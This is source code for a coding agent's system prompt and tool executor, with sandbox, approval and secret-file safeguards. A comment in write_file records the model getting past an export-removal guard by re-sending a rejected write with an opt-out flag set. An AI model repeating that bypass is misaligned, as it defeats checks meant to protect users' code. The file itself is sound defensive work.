    ? `\n## Project instructions (KODO.md)\n${kodoMd.slice(0, 6000)}\n`
    : "";

  const connected = mcpServers.filter((s) => s.ok && s.toolCount > 0);
  const mcpSection = connected.length
    ? `\n## Connected MCP servers\nThis project attaches external systems whose tools appear as \`mcp__<server>__<tool>\`:\n${connected.map((s) => `- ${s.name} (${s.toolCount} tool${s.toolCount === 1 ? "" : "s"})`).join("\n")}\nUse them when the task genuinely concerns that system. For reading/editing files in THIS workspace, always prefer the built-in tools (read_file/edit_file/grep/glob) — they handle undo snapshots, syntax validation and diffs that an external server does not.\n${
  mcpResources.length
    ? `\n### MCP resources (read with read_mcp_resource)\n${mcpResources.slice(0, 40).map((r) => `- \`${r.uri}\`${r.name && r.name !== r.uri ? ` — ${r.name}` : ""}${r.description ? `: ${r.description.slice(0, 120)}` : ""}`).join("\n")}\n`
    : ""
}`
    : "";

  const planModeSection = permissionMode === "plan"
    ? `\n## PLAN MODE ACTIVE\nMutating tools (edit_file, write_file, mutating bash) are DISABLED. Explore the workspace, then present a concrete implementation plan as your final text answer: files to change, what changes, in what order, and how to verify. Do NOT attempt edits.\n`
    : "";

  return `You are Kodo, an autonomous coding agent working directly in the user's workspace.
${currentDateLine()} Use it whenever "today / now / latest / recent / this year" matters — your training data is older than this.

# YOU APPLY CHANGES — you don't hand out code (most important rule)
When the user asks you to add / build / create / implement / change / fix / refactor / improve something, you MUST make the change yourself by calling write_file / edit_file on the real files. Do NOT paste a code block and tell the user where to put it — that is a failure. "Build a feedback form on /profile" means: find the route, create/edit the component files, wire it up, verify. Actually editing files is the whole point of this agent.
ONLY respond with code as text (without editing) when the user EXPLICITLY asks for that — e.g. "just show me the code", "don't edit anything", "give me the snippet", "how would I write…". Otherwise, always edit the files.
Same rule for RUNNING something — "run the server", "start the frontend", "how do I run this on port X": don't just print the command and tell the user to run it themselves, actually run it with bash. A dev server never exits on its own, so use \`run_in_background:true\` (otherwise the call just hangs until it times out and gets killed) — then call bash_output to confirm it actually started (a real port/URL in the output, no crash) BEFORE telling the user it's running. If something is likely already running on that port from an earlier turn, kill_shell it first — starting a second instance usually just fails with a port-in-use error instead of doing anything.

# How you work
1. UNDERSTAND — read the files involved before touching them. Use grep/glob to locate things; never guess file contents. When you need several independent, read-only things (e.g. reading N related component files before editing any of them, or a few unrelated greps), call them together as multiple tool calls in the SAME turn rather than one-at-a-time across separate turns — they run concurrently, so batching costs nothing and finishes faster. This does not apply to edit_file/write_file/bash/todo_write, which must stay one at a time and in order.
2. TRACK — for any request with 2+ distinct steps, maintain a todo list with todo_write and keep it updated as you go.
3. ACT — make focused, minimal edits with edit_file (preferred) or write_file (new files / full rewrites). Match the existing code style. This step is where you actually call the tools — don't stop at describing the change.
4. VERIFY — after code changes, check your work yourself: read the sub-project you touched (its package.json / project config) and run ITS actual typecheck, lint, build, or test command via bash — don't assume a project name, script name, or toolchain, discover it from what's really there, the same way you would in any unfamiliar repo. Re-read the edited region too. Fix what you broke before finishing. Typecheck/lint only prove the code PARSES — for a real functional claim, go further when the work calls for it:
   - Backend route/API work: start the server (run_in_background), then bash \`curl\` the actual endpoint(s) you touched and check the real response — don't conclude "it works" from reading the code. curl only reaches localhost/127.0.0.1 by default.
   - Frontend/UI work: start the dev server, then verify_ui the actual page (add actions for anything the feature requires — click a button, type into a field, wait for text to appear — and assertions for what should be true afterward) — it catches a component that typechecks but throws on render, or renders blank, which no static check can. If verify_ui reports it's not configured for this project, tell the user the exact .kodo/settings.json snippet it gave you rather than silently skipping UI verification. Don't call it done on a green typecheck alone.
   - If the project already has its own test suite/framework, extend it for the new logic you added, the same way you'd follow any other existing convention in an unfamiliar repo — but don't invent a test framework or culture for a project that doesn't have one unless asked.
   (If this workspace has a \`.kodo/settings.json\` \`hooks.stop\` command configured, it also runs automatically and blocks you from finishing until it passes — but that's a backstop, not a substitute for checking your own work.)
5. FINISH — when done, reply with plain text (no tool calls): a concise summary of what you CHANGED, file by file, and how you verified it. (Not a tutorial — a report of edits you made.) Only say "verified" / "tests pass" / "✅" if you actually ran that check THIS turn and saw it pass — never write it as a habitual closing line. If you didn't run a real check (no test/lint/build command, no server hit with curl, no verify_ui), say so plainly instead: e.g. "not verified — no build/test command found in this project."

# Rules
- Use the dedicated tool, not its bash equivalent: read_file (not \`bash cat\`), grep (not \`bash grep\`), glob (not \`bash find\`), list_files (not \`bash ls\`). This isn't style — edit_file only accepts a file that was read via the read_file TOOL (bash cat doesn't count, even though you saw the content), and grep/glob already exclude node_modules/.git/build output automatically while a raw bash search doesn't. Reserve bash's cat/grep/ls/find for when they're one step inside a larger shell pipeline (e.g. \`grep -l foo *.ts | xargs ...\`), not as your primary way to read or search.
- edit_file's old_string must match the file EXACTLY (copy it from read_file output, whitespace included) and be unique — include neighbouring lines to disambiguate.
- Never re-create a file that exists; read then edit it.
- Prefer several small edits over one giant rewrite. Rewrites lose the user's untouched code.
- NEVER write file content via bash (heredoc \`cat <<EOF\`, \`echo ... > file\`, \`node -e\`/\`python3 -c\`, etc.) — always write_file (new file) or edit_file (existing file). This applies even if a file feels large: if it doesn't fit in one write_file call, write a smaller version and extend it with edit_file, or split it into several edit_file additions — don't reach for bash as a workaround, it has a much smaller size limit and skips syntax validation, undo snapshots, and the diff shown to the user entirely.
- If a .ts/.tsx string needs to CONTAIN literal backtick characters as data (e.g. mock content with markdown code fences \`\`\`, or any text that itself uses backticks) — do NOT reach for a JS/TS template literal for the outer string. A template literal containing unescaped nested backticks is invalid syntax and write_file will correctly reject it; the fix is not a different tool, a bash workaround, or a helper script — it's a different STRING TYPE. Use a regular single/double-quoted string with \\n for newlines instead; it has no delimiter collision with the backticks inside it. If you get an "unterminated template literal" or similar parse error back, that specific mismatch — quote type vs. content — is almost always the cause: fix the string type, don't change tools.
- For a big multi-file build (many new components etc.), create files a few at a time across several turns rather than trying to fit everything into one response — a turn that runs out of room mid-file is worse than spreading the same work across more turns.
- If a tool call fails, read the error, adapt, and retry differently — don't repeat the identical call.
- Keep dependencies minimal; use bash \`npm install <pkg> --prefix <subproject>\` only when the task truly needs a new package.
- For a throwaway check (e.g. confirming what an installed package actually exports before you rely on it), write it under \`.kodo/scratch/\` and delete it with bash \`rm\` once you're done — never leave debug/check files sitting in the project's real source tree.
- Anything that doesn't exit on its own (dev servers, watch mode, long-running processes) MUST use bash's \`run_in_background:true\`, verified afterward with bash_output — never run it as a normal blocking bash call, and never just tell the user to run it themselves when you have the tools to do it.
- For UI/design/animation work: load the matching skill first (see list), respect the project's design tokens, and keep accessibility (contrast, reduced-motion) intact.
- Never touch .env, secrets, lockfiles, or files outside the workspace.

# Workspace questions — answer from evidence, never from assumption
Some requests are questions, not edits: "where is the CLI stored", "which file contains the router", "where is auth implemented", "what files are in this project", "what framework does this project use". They still belong to you, because only you can look. Handle them as a SHORT, targeted inspection, not a full build loop:
1. list_files at the relevant level (start at the root) to see what actually exists.
2. Read the package manifest(s) when the question is about entry points, scripts, dependencies, or tooling — a \`bin\` field answers "where is the CLI" directly and exactly.
3. grep/glob only to narrow further, with a DIFFERENT query each time — if two searches return nothing useful, change strategy (list the directory, read the manifest) instead of rephrasing the same search a third time.
4. Answer in plain text with the real paths you just saw — state them, don't hedge ("likely", "probably", "typically" about a path in a workspace you can read is a non-answer), and don't ask the user for permission to look further: if confirming the answer needs one more read_file or list_files, just make the call. Then stop — don't edit anything, and don't keep exploring past the answer.
Ground every path you name in real evidence: a tool result from this turn, or the workspace-layout listing below (that listing is this workspace, read at the start of this turn — but it is PARTIAL and depth-limited, so anything you can't actually see in it must be confirmed with a tool). Never state a path because memory, KODO.md, or the project's conventions imply it. A confidently wrong path is the worst possible answer to "where is X".
Search broadly before you conclude, and never guess a full path in a glob — glob a BASENAME pattern (\`**/kodo_graph.mjs\`, \`**/*router*\`) or grep the symbol, so the answer doesn't depend on guessing the directory right. A guessed path that misses is not evidence the file is absent. If your first search misses, widen it or list the likely parent directory — and finish the search yourself rather than reporting failure or asking the user whether to keep looking. Only report "not found" after a genuinely broad search (basename glob AND grep) came back empty.

# Honest failure — never fake a capability limit
You HAVE workspace access: read_file, list_files, glob, grep, bash. So these statements are FORBIDDEN, because they are false:
  "I can't access your workspace" / "I don't have visibility into your files" / "I can only reason about the public internet".
When inspection doesn't produce an answer, say which of these actually happened:
- A tool errored → report the real cause verbatim: "couldn't inspect the workspace — grep failed: ENOENT: no such file or directory". Never flatten a concrete error (ENOENT, permission denied, timeout, invalid path) into a vague access complaint.
- The search ran fine but matched nothing → "searched the workspace and found no CLI entry point" — that is a finding about the PROJECT, not about your abilities.
- You need something only the user has → ask with ask_user.

# Don't work blind — ask when it matters
Use ask_user before committing to a consequential guess: an ambiguous requirement with materially different implementations, a destructive/hard-to-reverse choice (deleting data, overwriting config, picking an irreversible approach), or missing information only the user has (which of several plausible targets, a credential/URL you don't have, a design preference with no existing convention to follow). Do NOT ask about anything discoverable by reading the code, grepping, or checking docs — do that instead. Do NOT ask about low-stakes details — just make a reasonable choice and mention it in your final summary. On your own initiative keep it to at most one or two questions per task, and never combine ask_user with other tool calls in the same turn.
EXCEPTION — when the user EXPLICITLY asks to be prompted for several specific pieces of information ("ask me for the target environment, branch and region first"), that instruction overrides the limit above: ask for EVERY field they listed, one ask_user call per field, in the order they listed them, waiting for each answer before asking the next. Do not collapse them into a single combined question, do not skip fields, do not guess any of them, and do not answer with a plan instead of asking — the user asked to be prompted, so prompting IS the task. Only after every field is answered do you continue with the work.

# Reading multiple files: batch vs delegate
Two different tools for two different situations — pick by whether you already know WHICH files matter:
- You already know the small set of files you need (e.g. "read these 4 related components before editing them"): call read_file for each of them as separate tool calls in the SAME turn — they run in parallel, so this costs nothing extra and is the default for known, bounded work.
- You do NOT yet know which files matter — an open-ended investigation ("how does auth work across this codebase", "find everywhere X is used", "research this library"), or answering it would mean reading roughly 6+ files just to find the relevant ones: use spawn_agent instead. It runs a read-only sub-agent in its OWN context window and returns only a findings report, so your own context doesn't fill up with every file it had to check. Spawn several for independent questions. Sub-agents can't edit — you make the actual changes yourself based on what they report.
Don't use spawn_agent for a lookup you can already scope to a handful of known files — batch those directly instead.

# Web search — don't answer stale facts from memory
You have web_search(query) and fetch_url(url). ALWAYS web_search first — never answer from memory — when the question is about anything time-sensitive or that changes over time, even if you think you already know: the "latest/newest/current/last/recent" version, release, price, score, WINNER, standings, ranking, or news; anything with "today/now/this year/as of"; who currently holds a role or title; or any fact tied to a date near or after your training cutoff. Your training data is stale, so a confident answer is often WRONG. Flow: web_search to find sources, then fetch_url the best result to read the real page (snippets can be stale). If the user gives a URL, fetch_url it. Do NOT search for the user's own codebase or stable general knowledge.
${planModeSection}${kodoSection}${memorySection}${skillSection}${subagentSection}${mcpSection}
# Workspace layout (partial)
${snapshot}
`;
}

// ── Tool executor ─────────────────────────────────────────────────────────────

/**
 * Build a tool context with a runtime attached.
 *
 * Exported so callers that assemble a context by hand — tests, and any future
 * embedder — get a real runtime explicitly rather than having executeTool
 * quietly manufacture one. That distinction matters: a default-to-host fallback
 * inside executeTool would mean a caller who forgot to pass a runtime still
 * runs, on the host, under whatever sandbox flag the user thought they set.
 * Here the choice is visible at the call site; there it would be invisible.
 */
export function createToolContext({ root, runtime = null, ...rest } = {}) {
  if (!root) throw new Error("createToolContext requires a workspace root");
  return {
    root,
    runtime: runtime || new HostRuntime({ root }),
    emit: null,
    sessionId: "ctx",
    requestId: "ctx",
    hooks: {},
    permissions: undefined,
    editedFiles: new Map(),
    readFiles: new Set(),
    bashCommands: [],
    todosRef: { current: [] },
    workspaceSnapshot: [],
    permissionMode: "auto",
    ...rest,
  };
}

export async function executeTool(name, args, ctx) {
  // A context without a runtime is a programming error, and it must surface as
  // one. Substituting a host runtime here is the single change that would turn
  // every sandbox guarantee in this file into a suggestion.
  if (!ctx?.runtime) {
    throw new TypeError(
      "executeTool: ctx.runtime is required — build the context with createToolContext(). " +
      "Tools must never fall back to direct host access.",
    );
  }
  const { root, emit, sessionId, requestId, hooks, permissions, editedFiles, todosRef, permissionMode, askUser, creds, isSubAgent, workspaceSnapshot, abortSignal } = ctx;
  if (args && typeof args === "object" && args.__kodo_parse_error__) {
    return {
      success: false,
      error: `${args.__kodo_parse_error__} This means the file content itself is fine — it just doesn't fit in one turn. Split the work into smaller calls: write a shorter version first with write_file then extend it with edit_file, or produce a large new file as several smaller edit_file additions after an initial small write_file. Do NOT switch to writing file content via bash (heredoc/cat/echo/node -e) — that isn't a workaround for this, it's a different tool with a much smaller size limit (2000 chars) that will fail faster and worse.`,
    };
  }
  try {
    switch (name) {
      case "read_file": {
        const relPath = String(args.path || "").trim();
        if (!relPath) return { success: false, error: "path is required" };
        if (isSensitiveFilePath(relPath)) {
          return { success: false, error: `Reading ${relPath} is blocked — it holds secrets/credentials. The agent is not allowed to load secret files into context.` };
        }
        const absPath = safeResolve(root, relPath);
        const content = await ctx.runtime.readFile(relPath, MAX_FILE_BYTES);
        if (content === null) return { success: false, error: `File not found: ${relPath}` };
        // Never dump binary bytes into the conversation — it corrupts the
        // request and makes providers 400. PDFs/images are handled elsewhere
        // (PDF text + image analysis are already provided as attachment context).
        if (looksBinary(content)) {
          const ext = path.extname(relPath).toLowerCase();
          return {
            success: false,
            error: ext === ".pdf"
              ? `${relPath} is a PDF — do NOT read it as a file. Its extracted text is already provided to you in the attachment context; use that.`
              : `${relPath} is a binary file (${ext || "unknown type"}) and can't be read as text. Skip it.`,
          };
        }
        emit?.({ type: "progress", stage: "exploring", message: `read ${relPath}` });
        ctx.readFiles.add(relPath);
        if (args.start_line || args.end_line) {
          const lines = content.split("\n");
          const start = Math.max(0, (Number(args.start_line) || 1) - 1);
          const end = Math.min(lines.length, Number(args.end_line) || lines.length);
          const numbered = lines.slice(start, end).map((l, i) => `${start + i + 1}→${l}`).join("\n");
          return { success: true, path: relPath, content: numbered, total_lines: lines.length };
        }
        return { success: true, path: relPath, content, total_lines: content.split("\n").length };
      }

      case "edit_file": {
        if (permissionMode === "plan") return { success: false, error: "Plan mode — mutating tools are disabled. Present your plan as text instead." };
        const relPath = String(args.path || "").trim();
        const oldString = String(args.old_string ?? "");
        const newString = String(args.new_string ?? "");
        if (!relPath || !oldString) return { success: false, error: "path and old_string are required" };
        if (oldString === newString) return { success: false, error: "old_string and new_string are identical" };
        if (isSensitiveFilePath(relPath)) return { success: false, error: `Editing ${relPath} is blocked — the agent may not modify secret/credential files.` };
        const absPath = safeResolve(root, relPath);
        const original = await ctx.runtime.readFile(relPath, MAX_FILE_BYTES);
        if (original === null) return { success: false, error: `File not found: ${relPath}. Use write_file to create new files.` };
        if (!ctx.readFiles.has(relPath)) return { success: false, error: `Read ${relPath} first (read_file) before editing it.` };

        const occurrences = original.split(oldString).length - 1;
        if (occurrences === 0) {
          return { success: false, error: `old_string not found in ${relPath}. Re-read the file — the exact text (including whitespace) must be copied from its current content.` };
        }
        if (occurrences > 1 && !args.replace_all) {
          return { success: false, error: `old_string appears ${occurrences} times in ${relPath}. Include more surrounding lines to make it unique, or pass replace_all:true.` };
        }

        const updated = args.replace_all
          ? original.split(oldString).join(newString)
          : original.replace(oldString, newString);

        const syntaxErr = validateSyntax(updated, absPath);
        if (syntaxErr) {
          return { success: false, error: `Edit rejected — it would break the file: ${syntaxErr}. The file is unchanged; fix the edit and retry.` };
        }

        await snapshotForUndo(root, sessionId, requestId, relPath, absPath);
        await ctx.runtime.writeFile(relPath, updated);
        await runPostEditHook(ctx.runtime, relPath, hooks, emit);
        editedFiles.set(relPath, editedFiles.get(relPath) || "edit");
        ctx.readFiles.add(relPath);

        emit?.({ type: "progress", stage: "executing", message: `✏️ edit ${relPath}` });
        emit?.({
          type: "file_diff",
          action: "edit",
          path: relPath,
          language: langFromExt(relPath),
          hunks: [{ kind: "replace", before: oldString.slice(0, HUNK_MAX), after: newString.slice(0, HUNK_MAX) }],
        });
        return { success: true, path: relPath, replacements: args.replace_all ? occurrences : 1 };
      }

      case "write_file": {
        if (permissionMode === "plan") return { success: false, error: "Plan mode — mutating tools are disabled. Present your plan as text instead." };
        const relPath = String(args.path || "").trim();
        const content = String(args.content ?? "");
        if (!relPath) return { success: false, error: "path is required" };
        if (!content.trim()) return { success: false, error: "content is empty — to create an empty file use bash `touch`" };
        if (isSensitiveFilePath(relPath)) return { success: false, error: `Writing ${relPath} is blocked — the agent may not create or overwrite secret/credential files.` };
        const absPath = safeResolve(root, relPath);
        const existing = await ctx.runtime.readFile(relPath, MAX_FILE_BYTES);
        if (existing !== null && !ctx.readFiles.has(relPath)) {
          return { success: false, error: `${relPath} already exists — read it first, then use edit_file for changes (or write_file after reading, for a deliberate full rewrite).` };
        }

        const syntaxErr = validateSyntax(content, absPath);
        if (syntaxErr) {
          // "The file is unchanged" is not padding — without it a rejected
          // write reads as a partial one, and the next move is an edit_file
          // against content that never reached disk. That fails with
          // "old_string not found", which looks like a different problem, and
          // the run burns its budget chasing it. edit_file's rejection has
          // always said this; write_file's silence was the asymmetry.
          return {
            success: false,
            error: `Write rejected — content is broken: ${syntaxErr}. ${existing !== null ? "The file is unchanged on disk (your new content was NOT written)" : "The file was NOT created"} — fix the content and send the complete file again with write_file.`,
          };
        }

        // A full-file rewrite is the usual move after a targeted edit is
        // rejected, and it is where pre-existing code silently disappears: the
        // model reconstructs the file from memory and omits exports it was
        // never asked to touch. The syntax gate cannot see this — dropping an
        // export leaves the file perfectly parseable. Observed three times in
        // the fullstack reproductions (`setTransport`+`request`, then `handle`
        // twice).
        //
        // UNCONDITIONAL, and deliberately so. The first version of this guard
        // offered the model an `allow_removals` opt-out; across five benchmark
        // runs the model answered two of the three rejections by re-issuing the
        // identical write with the flag set, and both rewrites destroyed
        // handle(). An escape hatch reachable from `args` is not a trust
        // boundary — `args` is model-controlled by definition, so the flag only
        // converted a hard stop into a one-token retry.
        //
        // Deliberate deletion is still available, through edit_file: removing
        // an export there requires quoting its exact current text, which is
        // precisely the property a from-memory rewrite lacks. So this closes
        // the lossy path without closing the intentional one.
        if (existing !== null) {
          const dropped = removedExports(existing, content, absPath);
          if (dropped.length) {
            return {
              success: false,
              error: `Write rejected — this rewrite would delete ${dropped.length} existing export(s) from ${relPath}: ${dropped.join(", ")}. The file is unchanged on disk. Re-read it and send the COMPLETE file including everything you are not changing. To remove an export on purpose, use edit_file on that specific declaration instead — a full rewrite cannot be used to delete exports.`,
            };
          }
        }

        await snapshotForUndo(root, sessionId, requestId, relPath, absPath);
        await ctx.runtime.writeFile(relPath, content);
        await runPostEditHook(ctx.runtime, relPath, hooks, emit);
        const action = existing === null ? "create" : "edit";
        editedFiles.set(relPath, action);
        ctx.readFiles.add(relPath);

        emit?.({ type: "progress", stage: "executing", message: `${action === "create" ? "➕ create" : "✏️ rewrite"} ${relPath}` });
        emit?.({
          type: "file_diff",
          action,
          path: relPath,
          language: langFromExt(relPath),
          hunks: existing === null
            ? [{ kind: "create", after: content.slice(0, HUNK_MAX) }]
            : [{ kind: "rewrite", before: existing.slice(0, HUNK_MAX), after: content.slice(0, HUNK_MAX) }],
        });
        return { success: true, path: relPath, action, bytes: content.length };
      }

      case "bash": {
        // Hard kill switch for locked-down / untrusted testing: set
        // KODO_DISABLE_BASH=1 to remove shell execution entirely. The agent can
        // still read/edit files, grep, glob and search the web.
        if (process.env.KODO_DISABLE_BASH === "1") {
          return { success: false, error: "The bash tool is disabled on this server (KODO_DISABLE_BASH=1). Accomplish the task with read_file/edit_file/write_file/grep instead." };
        }
        const command = String(args.command || "").trim();
        const invalid = validateBashCommand(command, permissions);
        if (invalid) return { success: false, error: invalid };
        if (permissionMode === "plan" && !BASH_READONLY_RE.test(command)) {
          return { success: false, error: "Plan mode — only read-only commands are allowed." };
        }

        // Claude Code-style per-command approval: a workspace "ask" rule
        // pauses for THIS specific command regardless of permissionMode —
        // independent of (and in addition to) the coarser "ask" permission
        // mode's one-time first-mutation gate elsewhere in the loop.
        // Two independent reasons to pause: a workspace "ask" rule, or the
        // built-in irreversible/production safety floor. Both route through the
        // SAME approval path, so PermissionRequest/PermissionDenied fire and
        // deny rules still win either way.
        const irreversible = isIrreversibleCommand(command, permissions);
        if (bashApprovalNeeded(command, permissions) || irreversible) {
          const verdict = await resolveApproval(ctx, {
            kind: irreversible ? "irreversible" : "bash",
            subject: command,
            question: irreversible
              ? `⚠️ This command is irreversible or affects production:\n\n${command}\n\nIt cannot be undone by Kodo. Run it?`
              : `This workspace requires approval before running:\n\n${command}`,
            header: irreversible ? "Confirm?" : "Run command?",
            payload: { command, irreversible },
          });
          // No approval, no execution — and never an inferred yes.
          if (!verdict.approved) return { success: false, error: verdict.error };
        }

        ctx.bashCommands?.push(command);

        if (args.run_in_background) {
          const { id, outputFile } = await runBashBackground(ctx.runtime, command);
          emit?.({ type: "progress", stage: "executing", message: `$ ${command.slice(0, 100)} (background: ${id})` });
          return {
            success: true,
            background: true,
            task_id: id,
            output_file: outputFile,
            message: `Started in the background as task "${id}". Use bash_output with this task_id to check it actually came up before telling the user it's running. Use kill_shell to stop it.`,
          };
        }

        const timeout = Math.min(Number(args.timeout_ms) || 120_000, 300_000);
        emit?.({ type: "progress", stage: "executing", message: `$ ${command.slice(0, 100)}` });
        const res = await runBash(ctx.runtime, command, { timeoutMs: timeout });
        return { success: res.exit_code === 0, ...res };
      }

      case "bash_output": {
        const taskId = String(args.task_id || "").trim();
        if (!taskId) return { success: false, error: "task_id is required" };
        return await readBackgroundTaskOutput(ctx.runtime, taskId);
      }

      case "kill_shell": {
        const taskId = String(args.task_id || "").trim();
        if (!taskId) return { success: false, error: "task_id is required" };
        emit?.({ type: "progress", stage: "executing", message: `⏹ stopping background task ${taskId}` });
        return killBackgroundTask(ctx.runtime, taskId);
      }

      case "grep": {
        const pattern = String(args.pattern || "").trim();
        if (!pattern) return { success: false, error: "pattern is required" };
        emit?.({ type: "progress", stage: "exploring", message: `grep "${pattern.slice(0, 60)}"` });
        const { matches, count } = await grepWorkspace(ctx.runtime, pattern, args.glob ? String(args.glob) : null);
        return { success: true, pattern, count, matches };
      }

      case "glob": {
        const pattern = String(args.pattern || "").trim();
        if (!pattern) return { success: false, error: "pattern is required" };
        const match = (p) => {
          const re = globToRegex(p);
          return ctx.workspaceSnapshot.filter((f) => !f.isDir && re.test(f.path)).map((f) => f.path).slice(0, 100);
        };
        const anchored = pattern.startsWith("**/") || pattern.includes("/") ? pattern : `**/${pattern}`;
        let files = match(anchored);

        // A path-shaped pattern ("agents/kodo_graph.mjs") is anchored at the
        // workspace root, so in a monorepo it silently misses the real file at
        // backend1/agents/kodo_graph.mjs. The model then reports the file as
        // absent — a wrong answer produced by a guessed directory, not by the
        // file being missing. Retry the same pattern as a suffix before
        // concluding nothing matched, and say so in the result.
        let note;
        if (!files.length && anchored.includes("/") && !anchored.startsWith("**/")) {
          const suffix = `**/${anchored}`;
          files = match(suffix);
          if (files.length) note = `No match anchored at the workspace root; these matched "${suffix}" instead (the path you guessed was relative to a subproject, not the root).`;
        }
        if (!files.length) {
          note = `No file matches "${pattern}". This does NOT mean it doesn't exist — a path-shaped pattern must match from the workspace root. Retry with just the basename ("**/${anchored.split("/").pop()}"), a wildcard on the name, or grep the symbol.`;
        }
        emit?.({ type: "progress", stage: "exploring", message: `glob ${pattern} — ${files.length} file(s)` });
        return { success: true, pattern, files, ...(note ? { note } : {}) };
      }

      case "list_files": {
        const dir = String(args.dir || "").trim();
        const absDir = dir ? safeResolve(root, dir) : root;
        const relDir = path.relative(root, absDir).replace(/\\/g, "/");
        const prefix = relDir ? `${relDir}/` : "";
        const entries = ctx.workspaceSnapshot
          .filter((f) => !prefix || f.path.startsWith(prefix))
          .map((f) => ({ ...f, path: prefix ? f.path.slice(prefix.length) : f.path }))
          .filter((f) => f.path && f.path.split("/").length <= 2)
          .slice(0, 120)
          .map((f) => (f.isDir ? `DIR  ${f.path}` : `FILE ${f.path}`));
        emit?.({ type: "progress", stage: "exploring", message: `ls ${dir || "."}` });
        return { success: true, dir: dir || ".", entries };
      }

      case "todo_write": {
        const todos = Array.isArray(args.todos) ? args.todos : [];
        todosRef.current = todos.map((t) => ({
          content: String(t?.content || "").slice(0, 200),
          status: ["pending", "in_progress", "completed"].includes(t?.status) ? t.status : "pending",
        }));
        const icon = { pending: "☐", in_progress: "◐", completed: "☑" };
        const summary = todosRef.current.map((t) => `${icon[t.status]} ${t.content}`).join("  ·  ");
        emit?.({ type: "todo", todos: todosRef.current });
        emit?.({ type: "progress", stage: "planning", message: `📋 ${summary.slice(0, 220)}` });
        return { success: true, count: todosRef.current.length };
      }

      case "list_memory_topics": {
        const topics = await listMemoryTopics(root);
        return topics.length ? { success: true, topics } : { success: true, topics: [], note: "No memory topics yet." };
      }

      case "read_memory_topic": {
        const topic = String(args.topic || "").trim();
        if (!topic) return { success: false, error: "topic is required" };
        const content = await readMemoryTopic(root, topic);
        if (!content) return { success: false, error: `No memory topic "${topic}" — use list_memory_topics.` };
        emit?.({ type: "progress", stage: "exploring", message: `recall: ${topic}` });
        return { success: true, topic, content: content.slice(0, MAX_TOOL_OUTPUT_CHARS) };
      }

      case "load_skill": {
        const skill = await loadSkillByName(root, args.name);
        if (!skill) return { success: false, error: `No skill named "${args.name}" — use a name from AVAILABLE SKILLS.` };
        emit?.({ type: "progress", stage: "exploring", message: `skill: ${skill.name}` });
        return { success: true, name: skill.name, content: skill.body.slice(0, MAX_TOOL_OUTPUT_CHARS) };
      }

      case "web_search": {
        emit?.({ type: "progress", stage: "exploring", message: `web search: "${String(args.query || "").slice(0, 60)}"` });
        return await webSearch(args.query);
      }

      case "fetch_url": {
        emit?.({ type: "progress", stage: "exploring", message: `fetch ${String(args.url || "").slice(0, 80)}` });
        return await fetchUrl(args.url);
      }

      case "verify_ui": {
        emit?.({ type: "progress", stage: "executing", message: `🖥️ verify_ui: ${String(args.url || "").slice(0, 80)}...` });
        return await verifyUi(args, ctx);
      }

      case "spawn_agent": {
        if (isSubAgent) {
          return { success: false, error: "Sub-agents cannot spawn further sub-agents. Do the investigation directly." };
        }
        const task = String(args.prompt || "").trim();
        if (!task) return { success: false, error: "prompt is required" };
        if (!creds) return { success: false, error: "Sub-agents are unavailable in this context." };

        // Resolve the requested agent from the registry. An omitted agent_type
        // resolves to the built-in explorer, preserving the previous behaviour
        // exactly.
        const requestedType = String(args.agent_type || "").trim() || "explorer";
        const { agents, errors: registryErrors } = await loadSubagentRegistry(root);
        const agent = agents.get(requestedType);
        if (!agent) {
          const available = [...agents.keys()].join(", ");
          const badFiles = registryErrors.length ? ` Some definitions failed to load: ${registryErrors.join("; ")}` : "";
          return { success: false, error: `Unknown agent_type "${requestedType}". Available: ${available}.${badFiles}` };
        }

        // SECURITY: the subagent's tools are an intersection with what THIS
        // context actually holds — a definition can never add a capability the
        // parent lacks. ctx.validToolNames is the set the parent was offered.
        const parentTools = ctx.validToolNames || new Set(AGENT_TOOLS.map((t) => t.function.name));
        const { effective, refused } = composeSubagentTools(agent, parentTools);
        if (!effective.length) {
          return { success: false, error: `Agent "${agent.name}" has no usable tools after applying this workspace's permissions: ${refused.map((r) => `${r.name} (${r.why})`).join(", ") || "(none requested)"}` };
        }

        // Model override is policy-gated; without an explicit allow rule the
        // subagent inherits the parent's model rather than escalating itself.
        const { model, overridden, refused: refusedModel } = resolveSubagentModel(agent, creds.model, permissions);
        if (refusedModel) {
          console.warn(`[Subagent] "${agent.name}" requested model "${refusedModel}" but no Subagent(model:…) allow rule permits it — inheriting ${creds.model}`);
        }

        const subagentId = `sub_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;

        // ── isolation: worktree ────────────────────────────────────────────
        // A real git checkout. The subagent's root becomes that directory, so
        // its edits genuinely cannot reach the parent workspace. If isolation
        // was requested and cannot be honoured, FAIL — never silently downgrade
        // to running against the live workspace.
        let worktree = null;
        if (agent.isolation === "worktree") {
          // THROUGH THE RUNTIME. This used to call the host worktree manager
          // directly, which created a real git checkout in the host's /tmp even
          // when the parent was sandboxed — a host filesystem write from a
          // confined run, and a directory the agent could not then see. The
          // runtime now decides where its worktrees live: a temp dir on the
          // host, a path inside the container under a sandbox.
          const created = await ctx.runtime.createWorktree({ subagentId, sessionId });
          if (!created.ok) return { success: false, error: created.error };
          worktree = created.worktree;
          emit?.({ type: "progress", stage: "exploring", message: `🌳 isolated worktree for ${agent.name}` });
        }

        // Skills declared by the definition are loaded and injected into the
        // SUBAGENT's system prompt only — never into the parent conversation.
        // A missing skill fails the spawn rather than silently degrading the
        // agent into one without its domain knowledge.
        let skillBlock = "";
        if (agent.skills?.length) {
          const loaded = [];
          const seen = new Set();
          for (const skillName of agent.skills) {
            if (seen.has(skillName)) continue; // dedupe, preserve first-seen order
            seen.add(skillName);
            const skill = await loadSkillByName(root, skillName);
            if (!skill) {
              return { success: false, error: `Agent "${agent.name}" declares skill "${skillName}", which could not be loaded from .kodo/skills/ or the built-in skills. Fix the definition or remove the reference.` };
            }
            loaded.push(`<skill name="${skillName}">\n${String(skill.body || skill).slice(0, 6000)}\n</skill>`);
          }
          if (loaded.length) skillBlock = `\n\n## Skills loaded for this agent\n${loaded.join("\n\n")}`;
        }

        const spawnOpts = {
          creds: overridden ? { ...creds, model } : creds,
          // THE isolation boundary: safeResolve() confines every path tool to
          // this root, so the subagent cannot escape its worktree.
          root: worktree ? worktree.path : root,
          // Same runtime as the parent, re-rooted when the sub-agent has its
          // own worktree. derive() is where a confined runtime refuses a root
          // it cannot actually reach, instead of quietly returning a host one.
          runtime: worktree ? ctx.runtime.derive(worktree.path) : ctx.runtime,
          description: String(args.description || "").trim() || agent.description,
          task,
          workspaceSnapshot: worktree ? [] : workspaceSnapshot,
          hooks,
          permissions,
          emit,
          fireHook: ctx.fireHook,
          parentSessionId: sessionId,
